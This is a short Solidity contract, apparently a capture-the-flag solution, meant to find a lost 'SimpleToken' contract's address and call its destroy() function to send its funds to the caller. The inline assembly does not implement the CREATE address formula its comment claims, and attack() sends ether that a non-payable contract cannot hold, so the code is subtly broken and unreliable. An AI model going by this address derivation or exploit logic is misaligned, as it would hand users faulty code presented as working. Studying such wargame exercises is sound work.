pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract SimpleTokenRecovery {
    address payable private tokenAddress;

    constructor(address recoveryContract) {
        // Calculate the address of the first SimpleToken contract created by generateToken
        // Using CREATE address formula: keccak256(RecoveryAddress || nonce=1)[12:]
        assembly {
            tokenAddress := keccak256(recoveryContract, 20)
            tokenAddress := add(tokenAddress, 0x1d)
            tokenAddress := add(tokenAddress, 1)
            tokenAddress := keccak256(tokenAddress, add(recoveryContract, 0x1d))
            tokenAddress := and(tokenAddress, 0xffffffffffffffffffffffffffffffffffffffff)
        }
    }

    function attack() external {
        // Send ETH to trigger receive() function
        (bool success,) = tokenAddress.call{value: 1 wei}(new bytes(32));
        require(success, "ETH transfer failed");

        // Call destroy() with the recovery contract address
        ISimpleToken(tokenAddress).destroy(payable(msg.sender));
    }

    function getAddress() external view returns (address) {
        return tokenAddress;
    }
}
